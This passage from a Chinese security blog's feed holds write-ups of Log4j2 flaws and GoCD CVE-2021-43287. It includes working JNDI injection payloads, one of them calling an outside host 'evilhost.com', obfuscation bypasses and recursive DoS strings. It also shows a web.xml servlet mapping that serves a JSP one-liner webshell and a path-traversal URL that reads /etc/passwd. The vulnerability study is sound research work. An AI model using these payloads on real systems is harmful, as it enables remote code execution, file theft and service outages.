href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><p><a href="https://www.cnblogs.com/jona-test/p/11399218.html">https://www.cnblogs.com/jona-test/p/11399218.html</a></p><p>更新 2021/12/24</p><p>看了大哥4ra1n的文章 <a href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p><p>其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接</p><p><img src="https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png" alt="image"></p><p>然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()</p><p>而NumberFormatException就是触发RuntimeException的子类。</p><p>${jndi:ldap://x.x.x.x:${java:version}/xxx}</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data</p><p>还有一个bypass思路是因为执行解析log4j2中的${}问题。简单的说也是将${::-x}解析成x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jn$&#123;::-d&#125;i:ldap://127.0.0.1:8880/&#125;</span><br></pre></td></tr></table></figure><h2 id="cve-dos"><a href="#cve-dos" class="headerlink" title="cve-dos"></a>cve-dos</h2><p>大哥成功获得apache的cve。<a href="https://xz.aliyun.com/t/10670">https://xz.aliyun.com/t/10670</a></p><p>简单的看了一下发现里面的思路和我不一样，大哥是想到了网络连接，也就可以存在一个网络超时的问题，而且log4j2支持递归解析。。所以就让他一直解析网络超时的ip…造成dos.</p><p>在这个cve通报中发现存在rce?简单的看了一下，我的理解是因为配置文件配置的这一次解析问题,如下配置中就有$${}这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Appenders&gt;</span><br><span class="line">    &lt;Console name=&quot;STDOUT&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout&gt;</span><br><span class="line">            &lt;pattern&gt;%d %p %c&#123;1.&#125; [%t] $$&#123;ctx:loginId&#125; %m%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/PatternLayout&gt;</span><br><span class="line">    &lt;/Console&gt;</span><br><span class="line">&lt;/Appenders&gt;</span><br></pre></td></tr></table></figure><p>而其中里面了ctx协议ContextMapLookup类，简单的说大概就是将我们解析的东西放到map里面然后在取出来。取出来之后在解析${xxxx}就造成了rce问题/dos问题。</p><h2 id="bypass-2-15"><a href="#bypass-2-15" class="headerlink" title="bypass 2.15"></a>bypass 2.15</h2><p>昨天在tw上看到了bypass 2.15版本,这个东西还没有具体去复现。不过看了一下exp大致懂了。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>不过环境要求比较严格而且真实环境的rce可能比较可能。。。</p><p>2021/12/20更新</p><p>今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 <a href="https://xz.aliyun.com/t/10689">https://xz.aliyun.com/t/10689</a></p><p>利用条件</p><p>1.开启lookup功能</p><p>2.macos系统</p><p>3.泛域名解析</p><p>4.本地存在gadget</p><p>该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>然后去绕过ldap服务的限制。</p><p><img src="https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png" alt="image-20211220183446609"></p><p>正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过<strong>if (!allowedClasses.contains(className))</strong></p><p>也其实就是我们在了ldap的时候的思路 <strong>LDAP服务攻击一般是先测Reference再测deserializeObject</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png" alt="image-20211220183705875"></p><h2 id="CVE-2021-45105"><a href="#CVE-2021-45105" class="headerlink" title="CVE-2021-45105"></a>CVE-2021-45105</h2><p>这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-::-$$&#123;::-$&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$ 会进入一个异常</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png" alt="image"></p><p><del>说不定其他解析表达式也存在。。。。</del></p><p><a href="https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor">https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor</a></p><p><a href="https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc">https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc</a></p><p>更新 2021/12/22</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在配置文件中配置：$$&#123;ctx:apiVersion&#125;   则输入 $&#123;$&#123;ctx:apiVersion&#125;&#125;或$&#123;$&#123;::-$&#123;::-$$&#123;::-aaa&#125;&#125;&#125;&#125;则可以造成递归dos</span><br><span class="line">在配置文件中配置：$&#123;ctx:apiVersion&#125;   则输入$&#123;$&#123;::-$&#123;::-$$&#123;::-dos&#125;&#125;&#125;&#125;则可以造成递归dos</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>cve:<a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&amp;mid=2247484028&amp;idx=1&amp;sn=5748c6b75530a786f1bf0622616413c6&amp;chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&amp;mpshare=1&amp;scene=23&amp;srcid=12298p7j6KLY39FVuwNzmFRD&amp;sharer_sharetime=1640749370687&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">聊聊配置文件 RCE 这件事</a></p><p>不愧是师傅总结的不错，简单的说就是通过配置文件去rce.<br>突然又想到了一个：web.xml里面添加servlet去实现解析一句话。<br>访问/exp路由就会解析</p><p><img src="https://user-images.githubusercontent.com/63966847/147626724-576ba23e-7fdf-4b73-b591-095af4578f8a.png" alt="image"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/WEB-INF/1.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/exp<span class="tag">&lt;/<span class="name">url-patten</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>主要是自己的问题，</p><p>第一点是读文档的习惯少导致不理解其中的意思失去第一时间拥有exp</p><p>第二点是自己没有考虑到dos中的网络连接超时问题。</p><p>第三点是自己发现了ResourceBundleLookup类却不知道其意思导致失去新思路的发现。</p><p>（如果官方在删除lookup功能我相信还会有更多的漏洞。。。。。。。。</p>]]></content>
    
    
    <summary type="html">log4j2漏洞</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE 2021 43287</title>
    <link href="http://example.com/2022/01/10/CVE-2021-43287/"/>
    <id>http://example.com/2022/01/10/CVE-2021-43287/</id>
    <published>2022-01-09T16:18:15.000Z</published>
    <updated>2022-11-25T12:54:47.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-43287"><a href="#CVE-2021-43287" class="headerlink" title="CVE 2021 43287"></a>CVE 2021 43287</h1><blockquote><p>GoCD 一款先进的持续集成和发布管理系统,由ThoughtWorks开发。（不要和Google的编程语言Go混淆了！）其前身为CruiseControl,是ThoughtWorks在做咨询和交付交付项目时自己开发的一款开源的持续集成工具。后来随着持续集成及持续部署的火热，ThoughtWorks专门成立了一个项目组，基于Cruise开发除了Go这款工具。ThoughtWorks开源持续交付工具Go。使用Go来建立起一个项目的持续部署pipeline是非常快的，非常方便。 GoCD的v20.6.0 - v21.2.0版本存在任意文件读取漏洞，可以通过/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd 对文件进行读取。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20.6.0 - v21.2.0</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621578-1249eeb8-f454-48ac-8edc-c5385a69661d.png" alt="image-20220115201323862"></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621580-174d710e-5900-4860-b877-6a67f115c13c.png" alt="image-20220115201231569"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488">https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488</a></p><p><img src="https://user-images.githubusercontent.com/63966847/149621583-5334295f-a207-4da9-b5ad-1182bacf76d2.png" alt="image-20220115201143857"></p><p>删除了路由。</p>]]></content>
    
    
    <summary type="html">CVE 2021 43287</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
